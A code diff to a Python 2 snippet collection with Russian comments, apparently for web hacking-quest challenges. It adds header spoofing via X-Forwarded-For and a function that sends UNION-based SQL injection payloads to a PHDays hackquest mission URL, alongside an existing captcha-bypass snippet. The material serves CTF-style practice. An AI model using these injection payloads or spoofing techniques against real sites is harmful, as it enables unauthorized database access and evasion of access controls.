@@ -32,7 +32,7 @@ def sample_addHeader():
 
 ### Обход графической капчи
 # На компьютере должен быть установлен tesseract (https://code.google.com/p/tesseract-ocr/)
-import urllib2, os
+import urllib, urllib2, os
 from BeautifulSoup import BeautifulSoup, NavigableString
 
 def sample_graphCap():
@@ -51,10 +51,19 @@ def sample_graphCap():
     br['answer'] = pz
     print br.submit().read()
 
+### Добавление X-Forwarded-for средствами Mechanize + перекодирование страницы в CP1251
 def antichat():
     br.addheaders = [('X-Forwarded-For', '10.10.10.10')]
     br.open("http://quest.rebz.net/sevenlev.php")
     print br.response().read().decode('cp1251')
 
+### Выполнение POST-запроса с подготовленными с помощью URLLib параметрами
+def POSTRequest():
+    br.method='POST'
+    data = urllib.urlencode({'id':'1 union select "herfrOmher",2--'})
+    req = urllib2.Request('http://hackquest.phdays.com/missions/lietome1/index.php?id=1 union select 2,1 --',data)
+    opener = urllib2.build_opener()
+    print opener.open(req).read()
+
 br = Browser()
-antichat()
+
